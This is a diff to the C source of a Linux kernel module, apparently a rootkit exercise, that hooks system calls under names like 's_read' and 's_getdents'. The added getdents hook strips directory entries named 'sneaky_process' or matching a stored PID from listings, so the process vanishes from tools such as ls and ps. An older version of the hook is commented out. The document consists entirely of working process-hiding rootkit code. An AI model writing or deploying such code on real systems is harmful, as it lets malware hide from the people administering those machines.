@@ -85,6 +85,7 @@ asmlinkage int s_open(const char* path, int flags, mode_t mode){
 
 
 //Define our new sneaky version of the 'read' syscall
+
 asmlinkage ssize_t s_read(int fd, void *buf, size_t count){
   char* head = NULL;
   // original syscall read
@@ -108,6 +109,29 @@ asmlinkage ssize_t s_read(int fd, void *buf, size_t count){
 }
 
 
+asmlinkage int s_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+  int read_size;
+  int offset;
+  read_size = original_getdents(fd, dirp, count);
+  
+  for (offset = 0; offset < read_size;) {
+    struct linux_dirent* dir = (void*)dirp + offset;
+    if (strcmp(dir->d_name, "sneaky_process") == 0 ||
+	strcmp(dir->d_name, s_pid) == 0) {
+      int dirent_size = dir->d_reclen;
+      int curr = ((void*)dirp + read_size) - ((void*)dir + dirent_size);
+      void* next = (void*)dir + dirent_size;
+      memmove(dir, next, curr);
+      read_size -= dirent_size;
+      continue;
+    }
+
+    offset += dir->d_reclen;
+  }
+  return read_size;
+}
+
+/*
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int s_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
   int read_size = original_getdents(fd, dirp, count);
@@ -134,7 +158,7 @@ asmlinkage int s_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned i
   
   return read_size;
 }
-
+*/
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void){
